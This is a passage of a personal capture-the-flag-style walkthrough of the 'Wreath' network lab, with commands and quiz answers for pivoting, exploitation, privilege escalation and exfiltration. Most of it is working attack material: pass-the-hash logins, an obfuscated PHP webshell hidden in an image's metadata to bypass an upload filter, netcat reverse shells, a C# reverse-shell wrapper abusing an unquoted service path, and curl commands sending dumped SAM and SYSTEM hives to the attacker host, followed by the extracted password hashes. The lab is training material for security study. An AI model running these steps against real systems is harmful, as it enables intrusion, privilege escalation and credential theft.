evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.101.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
PS> Invoke-Portscan.ps1
PS> Invoke-Portscan -Hosts 10.200.101.100 -TopPorts 50
```

![a2a21efd483f895dbb32a2362eef14a1.png](a2a21efd483f895dbb32a2362eef14a1-1.png)

Note that you can use `Get-Help Invoke-Portscan` to get the help menu

Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
> 80,3389

# Task 34: Personal PC Pivoting
Now it's time to use chisel to forward proxy to the .100 machine using the .150 machine as a "hop" relay

Using Evil-WinRM (download a chisel binary for Windows from the public Github):
```
upload /home/kali/THM/wreath/chisel.exe .      
netsh advfirewall firewall add rule name="Chisel-test1337" dir=in action=allow protocol=tcp localport=47069
```

On compromised git-serv (.150): 
```
.\chisel.exe server -p 47069 --socks5
```

On attacking box: 
```
./chisel client 10.200.101.150:47069 1080:socks
```

![0d19e4c46fc10ccc10fc6e654c0b7167.png](0d19e4c46fc10ccc10fc6e654c0b7167-1.png)
![407eda72b6323143f91acc72136b86db.png](407eda72b6323143f91acc72136b86db-1.png)

To access the webpage through the proxy, we have to create a FoxyProxy configuration on Kali's Firefox

![12e7d5863f91790777c9bf64060c8a93.png](12e7d5863f91790777c9bf64060c8a93-1.png)
![4ef772c7416d980c6ad5ee613219f79a.png](4ef772c7416d980c6ad5ee613219f79a-1.png)

This is what the website looks like: 

![f85409e3c57222ad2f10bf3e926cc454.png](f85409e3c57222ad2f10bf3e926cc454-1.png)

Using the Wappalyzer Firefox extension reveals the technologies the website is using: 

![b35321293ea71c3c9ee333f2b6c5d44e.png](b35321293ea71c3c9ee333f2b6c5d44e-1.png)

Identify the server-side Programming language (including the version number) used on the website.
> PHP 7.4.11

# Task 35: Personal PC The Wonders of Git
The idea of this next task is to download the source code of the git server with our WinRM access and reassemble it locally.

Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory?
> C:\GitStack\repositories\Website.git

Using Evil-WinRM to download the `Website.git` directory (this step takes a while)
```
cd C:\GitStack\repositories
download C:\GitStack\repositories\Website.git
```

![f10543b9ae90136978b22b3b44ffd59a.png](f10543b9ae90136978b22b3b44ffd59a-1.png)

Now is a good time to rename the directory downloaded and make a backup of it.
```
mv C:\\GitStack\\repositories\\Website.git Website.git
cp -r Website.git Website.git.bak
```

![7db9531c42384e7777206393cf4630bb.png](7db9531c42384e7777206393cf4630bb-1.png)

![6f390d8d3fc30799e4932d7a55080f23.png](6f390d8d3fc30799e4932d7a55080f23-1.png)

Next, we rename the subdirectory to `.git`
```
cd Website.git
mv C:\\GitStack\\repositories\\Website.git .git
```

Clone the GitTools repo to do some analysis on the git repo we have. 
```
git clone https://github.com/internetwache/GitTools
GitTools/Extractor/extractor.sh . Website
```

Now we can see, by looking at the parent references for each commit in the `commit-meta.txt` files, that the order of the commits are as follows:
1.  70dde80cc19ec76704567996738894828f4ee895
2.  82dfc97bec0d7582d485d9031c09abcb5c6b18f2
3.  345ac8b236064b431fa43f53d91c98c4834ef8f3

![5e5058b8ae369ceb8e1888ba8e506d0f.png](5e5058b8ae369ceb8e1888ba8e506d0f-1.png)

# Task 36: Personal PC Website Code Analysis
In the corresponding directory for the `345ac8b236064b431fa43f53d91c98c4834ef8f3`, we look for php files (because these are most likely to be vulnerable)  
```
find . -name *.php
```

![c484945ecbdec6d01bdd04165f509cb5.png](c484945ecbdec6d01bdd04165f509cb5-1.png)

Reading through the file we can determine some of the answers to the questions and possible vulnerabilities.

What does Thomas have to phone Mrs Walker about?
> neighbourhood watch meetings

Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
> basic auth

An interesting block of code is the following: 
```
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

The first line checks if the file really has dimensions, much like a normal image would. The next part uses the `explode` function to check the extension of the file. However, it only checks the `1` position (index starts at `0`), meaning if our file was `image.jpeg.php`, the string in the `1` position would be `jpeg` and the file would be uploaded successfully. This means we can possibly upload a webshell!

Which extensions are accepted (comma separated, no spaces or quotes)?
> jpg,jpeg,png,gif

Finally, if the file passes the filters, it gets uploaded to an `uploads/` directory.
```
$target = "uploads/".basename($_FILES["file"]["name"]);
...
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
```

# Task 37: Personal PC Exploit PoC
Now that we've done some source code analysis, we can go to the `/resources` directory through the browser on the live site. 

When prompted with a basic auth login, we can reuse credentials we've already seen from the AD environment: `Thomas:i<3ruby`

![2575d87333d9ee85b6caf750d792ce50.png](2575d87333d9ee85b6caf750d792ce50-1.png)

To bypass the filters, we know that the file needs to be named something like `image.jpeg.php` and that the file acts like an image. To do this, we can use `exiftool` to inject test PHP code into the `Comment` field of a real image. Just download an image and rename it to `test-1337.jpeg.php` or something (if it's a JPG file, etc.)

Create the test payload.
```
mv clown.jpeg test-1337.jpeg.php
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-1337.jpeg.php
```

Upload the file to the webserver. 
![8eb8f1cd6fbe3e1a406094ce6ea2794b.png](8eb8f1cd6fbe3e1a406094ce6ea2794b-1.png)

![6ab3b3b22f22a5e483891befb7e987f7.png](6ab3b3b22f22a5e483891befb7e987f7-1.png)

We can see that the test payload works! We can execute arbitrary PHP code. 

![642c949105be20cf5a9038b020677b5b.png](642c949105be20cf5a9038b020677b5b-1.png)

# Task 38: AV Evasion Introduction
 Which category of evasion covers uploading a file to the storage on the target before executing it?
 > on-disk evasion

 What does AMSI stand for?
 > anti-malware scan interface

Which category of evasion does AMSI affect?
 > in-memory evasion

# Task 39: AV Evasion AV Detection Methods
 What other name can be used for Dynamic/Heuristic detection methods?
 > behavioural

If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?
> static

When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?
> pre-defined rules

What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
> password

# Task 40: AV Evasion PHP Payload Obfuscation
The webshell payload we will use is primitive, but it will be obfuscated to evade AV. Use of this tool is recommended: https://www.gaijin.at/en/tools/php-obfuscator

```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

Obfuscated payload (need to manually escape the `$` chars so that Bash doesn't get mad): 
```
<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>
```

We can now copy the test payload and weaponize a webshell. 
```
cp test-1337.jpeg.php_original shell-1337.jpeg.php
exiftool -Comment="<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>" shell-1337.jpeg.php
```

![d04a701ea8c4830338aba82790b7bec7.png](d04a701ea8c4830338aba82790b7bec7-1.png)

After uploading the new file, we can access the file in the browser and use the `wreath` parameter to specify commands to execute. 

![9d7b1f7f7f68e6dab0ad0c0d6a877d0c.png](9d7b1f7f7f68e6dab0ad0c0d6a877d0c-1.png)

What is the Host Name of the target?
> wreath-pc

What is our current username (include the domain in this)?
> wreath-pc\thomas

# Task 41: AV Evasion Compiling Netcat & Reverse Shell
At this point we can upload a netcat binary for a reverse shell. Normally, we might have to obfuscate and/or cross-compile the binary, but in this case, publicly available binaries should work fine. 

On Kali: 
```
git clone https://github.com/int0x33/nc.exe/
```

Then, host a webserver (like using updog) and use the webshell to download the binary. 
```
curl http://10.50.102.106:9090/nc64.exe -o c:\\windows\\temp\\nc-test1337.exe
```

What output do you get when running the command: certutil.exe?
> CertUtil: -dump command completed successfully.

Finally, set up a reverse netcat listener on Kali and use the webshell RCE to activate the reverse shell!
```
nc -nvlp 51002  # on Kali
powershell.exe c:\\windows\\temp\\nc-test1337.exe 10.50.102.106 51002 -e cmd.exe  # on target (webshell)
```

![36eb95e53f9bb8fe927fa74f66abbf59.png](36eb95e53f9bb8fe927fa74f66abbf59-1.png)

Success!
![f653fd2da6b49f8320b52f2e2d9dc645.png](f653fd2da6b49f8320b52f2e2d9dc645-1.png)

# Task 42: AV Evasion Enumeration
One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?
> SeImpersonatePrivilege

Looking for non-default services: 
```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

![94bc12b5af0ea5d50aadab84527b026c.png](94bc12b5af0ea5d50aadab84527b026c-1.png)

What is the Name (second column from the left) of this service?
> SystemExplorerHelpService

In short, if any of the directories in that path contain spaces (which several do) and are writeable (which we are about to check), then -- assuming the service is running as the NT AUTHORITY\SYSTEM account, we might be able to elevate privileges by abusing the Unquoted Service Path. 
 
Check to see what account the service runs: 
```
sc qc SystemExplorerHelpService
```

![e4906d31dc81fd16ad531d633842913c.png](e4906d31dc81fd16ad531d633842913c-1.png)

Is the service running as the local system account (Aye/Nay)?
> aye

Check the permissions on the directory. If writable, then the exploit works. 
```
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

Yep, we have full control! Nice.
![b982215536d74e3490eab48e486d6810.png](b982215536d74e3490eab48e486d6810-1.png)

# Task 43: AV Evasion Privilege Escalation
The big idea in this section is to create an executable that opens up a netcat reverse shell back to the attacker machine. The service with the unquoted service path vulnerability will be used to execute the netcat wrapper as SYSTEM, thus rooting the box.

We can use Visual Studio or mono (`apt install mono-devel`) to compile the following C# executable: 
```
using System;
using System.Diagnostics;
namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-test1337.exe", "10.50.102.106 443 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

Save the file as `Wrapper.cs` and compile with Mono using the `mcs` compiler: 
```
mcs Wrapper.cs
```

As is standard, run an HTTP server on Kali and use curl on the target machine to transfer the exe.
```
curl http://10.50.102.106:9090/Wrapper.exe -o %TEMP%\wrapper-test1337.exe
```

Then, test with a netcat listener and run the wrapper exe. You should get a reverse shell (not root yet)
```
nc -nvlp 443  # on Kali
%TEMP%\wrapper-test1337.exe  # on target
```

![4419e25a28c69da3fab4b60a277556fc.png](4419e25a28c69da3fab4b60a277556fc-1.png)
![41f46b20acd33d3e497daea2b6243414.png](41f46b20acd33d3e497daea2b6243414-1.png)

Now it's time to exploit the spaces in the unquoted service path found earlier. 
This is how Windows looks for the service file with no quotes + spaces for `C:\Directory One\Directory Two\Executable.exe`
1.  `C:\Directory.exe`
2.  `C:\Directory One\Directory.exe`
3.  `C:\Directory One\Directory Two\Executable.exe`

With our example (`C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`), we have some choices: 
1. `C:\Program.exe` (probably restricted permissions)
2. `C:\Program Files (x86)\System.exe` (again, probably restricted)
3. `C:\Program Files (x86)\System Explorer\System.exe` (we know we have full access to this!)

Therefore we can copy our wrapper to `C:\Program Files (x86)\System Explorer\System.exe` and restart the service for our root shell!
```
# on kali
nc -nvlp 443

# below on target
copy %TEMP%\wrapper-test1337.exe "C:\Program Files (x86)\System Explorer\System.exe"
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

Note that the service seems to have failed to start because our wrapper is technically not a service, just an executable.
![2e7c40c880740989bf98dc7aa9dbf4b9.png](2e7c40c880740989bf98dc7aa9dbf4b9-1.png)

Success!
![45d589980ca827391b92526226cc680a.png](45d589980ca827391b92526226cc680a-1.png)

Then we can cleanup after ourselves.
```
del "C:\Program Files (x86)\System Explorer\System.exe"
sc start SystemExplorerHelpService
```

# Task 44: Exfiltration Exfiltration Techniques and Post Exploitation
Exfiltration of data should only be done with explicit permission. Common methods are DNS, HTTPS, ICMP (encrypted / stealthy) whereas FTP, TFTP, SMB, HTTP are more noisy.

 Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?
 > nay

For what reason is HTTPS preferred over HTTP during exfiltration?
> encryption

Local user hashes are stored in the Windows Registry (SAM hive) while Windows is running. Also found as a file at `C:\Windows\System32\Config\SAM`, but this should not be readable while the computer is running. 

Dump the SAM and SYSTEM hives (both are needed b/c SYSTEM hive contains boot key for machine)
```
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

Transfer the files by uploading them to updog: 
```
curl -v -XPOST -F "file=@c:\windows\system32\sam.bak;filename=sam.bak" -F "path=./" http://10.50.102.106:9090/upload
curl -v -XPOST -F "file=@c:\windows\system32\system.bak;filename=system.bak" -F "path=./" http://10.50.102.106:9090/upload
```

![159d22ae65629505be57bd53fc4522b8.png](159d22ae65629505be57bd53fc4522b8-1.png)
![7da8a23c78ac87101ae5f1163ec757f2.png](7da8a23c78ac87101ae5f1163ec757f2-1.png)
![d2062a105864ab71b59ee7288d594fbb.png](d2062a105864ab71b59ee7288d594fbb-1.png)
![9fc9179442344012dd8bbe7aefb67009.png](9fc9179442344012dd8bbe7aefb67009-1.png)

Finally, dump the hashes with secretsdump on Kali
```
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

Results (format of Username, RID, LM hash, NT hash -- separated by colons): 
```
[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up... 
```

![f1ff2d9316a52236c3040a39e86c38df.png](f1ff2d9316a52236c3040a39e86c38df-1.png)

What is the Administrator NT hash for this target?
> a05c3c807ceeb48c47252568da284cd2

On the target machine, remove the .bak dumps and any tools or other remnants on the system. 
```
del sam.bak
del system.bak
```

![6df1896014d7f43d8b2a5f70bc1520d9.png](6df1896014d7f43d8b2a5f70bc1520d9-1.png)

